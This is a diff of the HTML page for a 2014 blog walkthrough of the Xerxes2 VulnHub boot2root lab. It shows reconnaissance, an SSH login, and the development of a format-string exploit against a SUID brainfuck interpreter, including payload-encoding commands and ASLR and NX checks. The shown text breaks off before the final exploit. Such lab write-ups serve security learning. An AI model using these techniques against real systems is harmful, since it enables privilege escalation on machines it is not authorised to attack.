@@ -1,9 +1,14 @@
 <!DOCTYPE html>
 <html lang="en-us">
 <head>
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="https://leonjza.github.io/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title> Beating Xerxes2 | #!/slash/note</title>
+  <link rel = 'canonical' href = 'https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/'>
   <meta name="description" content="[&#39;Caffeine fueled&#39;, &#39;(╯°□°)╯︵ ┻━┻&#39;, &#39;Security guy&#39;, &#39;Metalhead&#39;, &#39;I saw your password&#39;, &#39;KOOBo&#43;KXleKAv&#43;KXlSnjgaM=&#39;]">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="all,follow">
@@ -14,8 +19,8 @@ Xerxes2 is a successor in a boot2root series by @barrebas hosted by @VulnHub. If
 Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read /root/flag.txt. This is the path I took to read the flag and gain root command execution. Enjoy!" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2014-08-09T16:59:53&#43;00:00" />
-<meta property="article:modified_time" content="2014-08-09T16:59:53&#43;00:00" />
+<meta property="article:published_time" content="2014-08-09T16:59:53+00:00" />
+<meta property="article:modified_time" content="2014-08-09T16:59:53+00:00" />
 
 
   <meta name="twitter:card" content="summary"/>
@@ -26,8 +31,11 @@ Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to
 
   
   
+    
   
-  <link rel="stylesheet" href="https://leonjza.github.io/css/style-white.css">
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
   
    <link rel="stylesheet" href="https://leonjza.github.io/css/cactus-custom.css"> 
   
@@ -38,7 +46,7 @@ Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to
   
 
   
-<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.png" />
+<link rel="icon" type="image/png" href="https://leonjza.github.io/images/favicon.ico" />
 
   
   
@@ -66,8 +74,8 @@ if (!doNotTrack) {
 
   <div id="header-post">
   <a id="menu-icon" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" class="active"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
   <span id="menu" style="visibility: visible;">
     <span id="nav">
       <ul>
@@ -87,25 +95,25 @@ if (!doNotTrack) {
       <ul>
         
         <li>
-          <a class="icon" href=" https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/">
+          <a class="icon" href=" https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/" aria-label="Previous">
             <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
           </a>
         </li>
         
         
         <li>
-          <a class="icon" href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">
+          <a class="icon" href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/" aria-label="Next">
             <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
           </a>
         </li>
         
         <li>
-          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
             <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
           </a>
         </li>
         <li>
-          <a class="icon" href="#">
+          <a class="icon" href="#" aria-label="Share">
             <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
           </a>
         </li>
@@ -125,57 +133,47 @@ if (!doNotTrack) {
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f" aria-label="Facebook">
       <i class="fab fa-facebook " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&text=Beating%20Xerxes2">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&text=Beating%20Xerxes2" aria-label="Twitter">
       <i class="fab fa-twitter " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2" aria-label="Linkedin">
       <i class="fab fa-linkedin " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&is_video=false&description=Beating%20Xerxes2">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&is_video=false&description=Beating%20Xerxes2" aria-label="Pinterest">
       <i class="fab fa-pinterest " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=Beating%20Xerxes2&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f">
+    <a class="icon" href="mailto:?subject=Beating%20Xerxes2&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f" aria-label="Email">
       <i class="fas fa-envelope " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2" aria-label="Pocket">
       <i class="fab fa-get-pocket " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2" aria-label="reddit">
       <i class="fab fa-reddit " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
-      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2">
-      <i class="fab fa-digg " aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&name=Beating%20Xerxes2&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3eXerxes2%20is%20a%20successor%20in%20a%20boot2root%20series%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fbarrebas%22%3e%40barrebas%3c%2fa%3e%20hosted%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fvulnhub%22%3e%40VulnHub%3c%2fa%3e.%20If%20you%20haven%26rsquo%3bt%20done%20it%20yet%2c%20close%20this%20article%20%3cem%3enow%3c%2fem%3e%20and%20go%20learn%20by%20doing%20it%21%3c%2fp%3e%0a%3cp%3eXerxes2%2c%20like%20most%20other%20boot2root%20type%20CTF%26rsquo%3bs%2c%20has%20once%20again%20forced%20me%20to%20learn%20a%20whole%20lot%20more%20than%20I%20thought%20possible.%20In%20total%20it%20took%20me%20about%203%20or%204%20days%20on%20and%20off%20to%20complete.%20The%20goal%20was%20as%20usual%2c%20read%20%3ccode%3e%2froot%2fflag.txt%3c%2fcode%3e.%20This%20is%20the%20path%20I%20took%20to%20read%20the%20flag%20and%20gain%20root%20command%20execution.%20Enjoy%21%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&name=Beating%20Xerxes2&description=%3ch2%20id%3d%22foreword%22%3eforeword%3c%2fh2%3e%0a%3cp%3eXerxes2%20is%20a%20successor%20in%20a%20boot2root%20series%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fbarrebas%22%3e%40barrebas%3c%2fa%3e%20hosted%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fvulnhub%22%3e%40VulnHub%3c%2fa%3e.%20If%20you%20haven%26rsquo%3bt%20done%20it%20yet%2c%20close%20this%20article%20%3cem%3enow%3c%2fem%3e%20and%20go%20learn%20by%20doing%20it%21%3c%2fp%3e%0a%3cp%3eXerxes2%2c%20like%20most%20other%20boot2root%20type%20CTF%26rsquo%3bs%2c%20has%20once%20again%20forced%20me%20to%20learn%20a%20whole%20lot%20more%20than%20I%20thought%20possible.%20In%20total%20it%20took%20me%20about%203%20or%204%20days%20on%20and%20off%20to%20complete.%20The%20goal%20was%20as%20usual%2c%20read%20%3ccode%3e%2froot%2fflag.txt%3c%2fcode%3e.%20This%20is%20the%20path%20I%20took%20to%20read%20the%20flag%20and%20gain%20root%20command%20execution.%20Enjoy%21%3c%2fp%3e" aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&t=Beating%20Xerxes2">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&t=Beating%20Xerxes2" aria-label="Hacker News">
       <i class="fab fa-hacker-news " aria-hidden="true"></i>
     </a>
   </li>
@@ -220,38 +218,32 @@ if (!doNotTrack) {
       </h1>
       <div class="meta">
         
-        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <span itemprop="name">
-            
-              #!/slash/note
-            
-          </span>
-        </span>
-        
         <div class="postdate">
           
           <time datetime="2014-08-09 16:59:53 &#43;0000 UTC" itemprop="datePublished">2014-08-09</time>
           
         </div>
         
+        
+        
         <div class="article-category">
-          <i class="fas fa-archive"></i>
-          
-          
-          <a class="category-link" href="https://leonjza.github.io/categories/ctf">CTF</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/solution">Solution</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/challenge">Challenge</a>
-          
-           ,  
-          <a class="category-link" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
-          
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="https://leonjza.github.io/categories/ctf">CTF</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/solution">Solution</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/challenge">Challenge</a>
+            
+             ,  
+            <a class="category-link" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
+            
         </div>
         
         
@@ -265,7 +257,7 @@ if (!doNotTrack) {
 <p>Xerxes2, like most other boot2root type CTF&rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read <code>/root/flag.txt</code>. This is the path I took to read the flag and gain root command execution. Enjoy!</p>
 <h2 id="getting-started">getting started</h2>
 <p>The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap -v --reason -sV 192.168.56.102 -p-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# nmap -v --reason -sV 192.168.56.102 -p-
 
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-09 17:14 SAST
 [...]
@@ -282,7 +274,7 @@ Nmap <span style="color:#f00">done</span>: <span style="color:#f60">1</span> IP 
 
 </code></pre></div><p>Well this gives us a boat load to test out already!</p>
 <p>I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened <code>nc</code> to the port and redirected the output to a file <code>nc-string</code>. Once the string echoed completely, I quit the <code>nc</code>, and pushed the resultant string through a base64 decode and ran a <code>file</code> against it:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~#  nc 192.168.56.102 <span style="color:#f60">4444</span> | tee nc-string
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~#  nc 192.168.56.102 <span style="color:#f60">4444</span> | tee nc-string
 [...]
 qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
 qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
@@ -312,7 +304,7 @@ nc-data: MPEG ADTS, layer III, v2,  <span style="color:#f60">64</span> kbps, 22.
 </figure>
 
 <p>And then a easy SSH in:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh -i delacroix delacroix@192.168.56.102
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~# ssh -i delacroix delacroix@192.168.56.102
 The authenticity of host <span style="color:#87ceeb">&#39;192.168.56.102 (192.168.56.102)&#39;</span> can<span style="color:#87ceeb">&#39;t be established.
 </span><span style="color:#87ceeb">ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
 </span><span style="color:#87ceeb">Are you sure you want to continue connecting (yes/no)? yes
@@ -334,7 +326,7 @@ The authenticity of host <span style="color:#87ceeb">&#39;192.168.56.102 (192.16
 </span></code></pre></div><h2 id="becoming-polito---the-why">becoming polito - the why</h2>
 <p>Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary <code>/opt/bf</code>, owned by <code>polito</code> and had the SUID bit set for him. There was also a folder <code>/opt/backup</code>, with a file <code>korenchkin.tar.enc</code>. There was also mail in <code>/var/mail</code> for the user <code>korenchkin</code> which I am not able to read yet.</p>
 <p>More interestingly, the <code>.bash_history</code> for the user I am now (delacroix), revealed that the <code>/opt/bf</code> command was recently run, and the sources for this binary was available as <code>bf.c</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ ls -lh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ ls -lh
 total 8.0K
 -rw-r--r-- <span style="color:#f60">1</span> delacroix delacroix 1.6K Jul <span style="color:#f60">16</span> 12:42 bf.c
 -rw-r--r-- <span style="color:#f60">1</span> delacroix delacroix  <span style="color:#f60">100</span> Aug  <span style="color:#f60">9</span> 10:23 Untitled0.ipynb
@@ -354,7 +346,7 @@ LOOK DEEPERdelacroix@xerxes2:~$
 </code></pre></div><p>As you can see above, running it just prints <strong>LOOK DEEPER</strong>. I recognized the syntax as <a href="http://en.wikipedia.org/wiki/Brainfuck">brainfk</a> and figured that <code>/opt/bf</code> was simply a brainfk interpreter. But wait, lets inspect <code>bf.c</code>!</p>
 <h3 id="inspecting-bfc">inspecting bf.c</h3>
 <p>A quick read of <code>bf.c</code> confirmed the suspicions that <code>/opt/bf</code> was simply a brainfk interpreter. A buffer was set for the input program, then a function called <code>bf()</code> was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f00">case</span> <span style="color:#87ceeb">&#39;.&#39;</span>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f00">case</span> <span style="color:#87ceeb">&#39;.&#39;</span>:
     printf(<span style="color:#87ceeb">&#34;%c&#34;</span>, buf[datapointer]);
     <span style="color:#f00">break</span>;
 <span style="color:#f00">case</span> <span style="color:#87ceeb">&#39;,&#39;</span>:
@@ -376,7 +368,7 @@ LOOK DEEPERdelacroix@xerxes2:~$
 <p>That was our brainfk class for the day.</p>
 <h3 id="finding-the-bf-vuln">finding the bf vuln</h3>
 <p>With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read <code>bf.c</code>, and realized that one of the case statements was for <code>#</code>, and that when a hash is present it will run:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f00">case</span> <span style="color:#87ceeb">&#39;#&#39;</span>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f00">case</span> <span style="color:#87ceeb">&#39;#&#39;</span>:
     <span style="color:#0f0">// new feature
 </span><span style="color:#0f0"></span>    printf(buf);
     <span style="color:#f00">break</span>;
@@ -406,23 +398,23 @@ LOOK DEEPERdelacroix@xerxes2:~$
 <p>So, lets work with this.</p>
 <p>First of all, the program will only <code>printf(buf)</code> the buffer which is brainfk. This is triggered with a <code>#</code>. For us to be able to do anything even remotely related to brainfk, we need to ensure that our payloads are encoded into brainfk before it gets fed to <code>/opt/bf</code>. Remembering the research that was done, I opted to print as many <code>+</code>&rsquo;s as the ASCII value of the character I wanted, and them simply increment the data cell with <code>&gt;</code>, preparing for the next character.</p>
 <p>To test my theory, I prepared my first payload using <code>python -c</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ echo <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;+&#34; * ord(&#34;a&#34;)&#39;</span><span style="color:#f00">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ echo <span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;+&#34; * ord(&#34;a&#34;)&#39;</span><span style="color:#f00">)</span>
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&#34;</span>
 a
 </code></pre></div><p>That printed the character <code>a</code> as expected. Great! However, we need to be able to print far more character, and multiples too, so lets see if we increment the pointer by 1 will it <code>printf(buf)</code> that too?</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#&#34;</span>
 aa
 </code></pre></div><p>2 <code>a</code>&rsquo;s! Awesome. So the theory works. However, the last thing I was going to do was copy paste all that crap, so instead, lets write some python and use <a href="https://docs.python.org/2/tutorial/datastructures.html#list-comprehensions">list comprehension</a> to prepare our payloads for <code>/opt/bf</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f00">print</span> <span style="color:#87ceeb">&#34;&gt;&#34;</span>.join([<span style="color:#87ceeb">&#34;+&#34;</span> * ord(x) <span style="color:#f00">for</span> x in (<span style="color:#87ceeb">&#34;the quick brown fox&#34;</span>)])
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">print <span style="color:#87ceeb">&#34;&gt;&#34;</span>.join([<span style="color:#87ceeb">&#34;+&#34;</span> * ord(x) <span style="color:#f00">for</span> x in (<span style="color:#87ceeb">&#34;the quick brown fox&#34;</span>)])
 </code></pre></div><p>You can copy and paste the above command into a python shell and see the amount of <code>+</code> there are haha.</p>
 <p>Anyways, that settled the brainfk problem.</p>
 <h3 id="optbf---part2">/opt/bf - part2</h3>
 <p>Now that we can easily provide input to <code>/opt/bf</code> to print using the vulnerable <code>printf()</code> function, it was time to test the actual format string vulnerability. Just like the above mentioned resources (and many many others on the internet) have shown, we provide some <code>AAAA</code> and search for them:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;AAAA&#34; + &#34;.%x&#34; * 20 + &#34;\n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;AAAA&#34; + &#34;.%x&#34; * 20 + &#34;\n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
 AAAA.b777bff4.0.0.bf842d58.b779b9c0.40.112a.bf83b820.b777bff4.bf842d58.80486eb.bf843860.bf83b820.7530.0.41414141.2e78252e.252e7825.78252e78.2e78252e
 </code></pre></div><p>Here we are using the previously built brainfk payload generator, and giving it format strings, searching for the <code>AAAA</code> input we have given it. Instead of typing like 20 <code>%s</code>, I just use python to do the hard work for me. As you can see, the string <code>41414141</code> is present in the output. We can test if we are able to use direct parameter access to access just the string we want:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;AAAA&#34; + &#34;.%16$x&#34; &#34;\n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ /opt/bf <span style="color:#87ceeb">&#34;</span><span style="color:#f00">$(</span>python -c <span style="color:#87ceeb">&#39;print &#34;&gt;&#34;.join([&#34;+&#34; * ord(x) for x in (&#34;AAAA&#34; + &#34;.%16$x&#34; &#34;\n&#34;)])&#39;</span><span style="color:#f00">)</span><span style="color:#87ceeb">#&#34;</span>
 AAAA.41414141
 </code></pre></div><p>Yup! Parameter 16 gives us what we need :)</p>
 <p>Great. Were making progress&hellip; I think.</p>
@@ -430,10 +422,10 @@ AAAA.41414141
 <h3 id="optbf---part3">/opt/bf - part3</h3>
 <p>Now that we know where we can start manipulating pointers, we need to find out <em>what</em> we should manipulate. There are many options here, however your decision on which path to take is influenced by many vectors.</p>
 <p>First of all, <code>/opt/bf</code> was compiled with the NX bit:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ readelf -l /opt/bf | grep STACK
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
 </code></pre></div><p>Secondly, ASLR is enabled, and can be seen when printing the shared library dependencies. The memory positions are different for every check:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ ldd /opt/bf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ ldd /opt/bf
     linux-gate.so.1 =&gt;  (0xb7734000)
     libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb75c9000)
     /lib/ld-linux.so.2 (0xb7735000)
@@ -447,7 +439,7 @@ delacroix@xerxes2:~$ ldd /opt/bf
     /lib/ld-linux.so.2 (0xb77c1000)
 delacroix@xerxes2:~$
 </code></pre></div><p>Thankfully, since this is a x86 (32bit) OS, its quite trivial to disable this (sort of) with <code>ulimit -s unlimited</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">delacroix@xerxes2:~$ ulimit -s unlimited
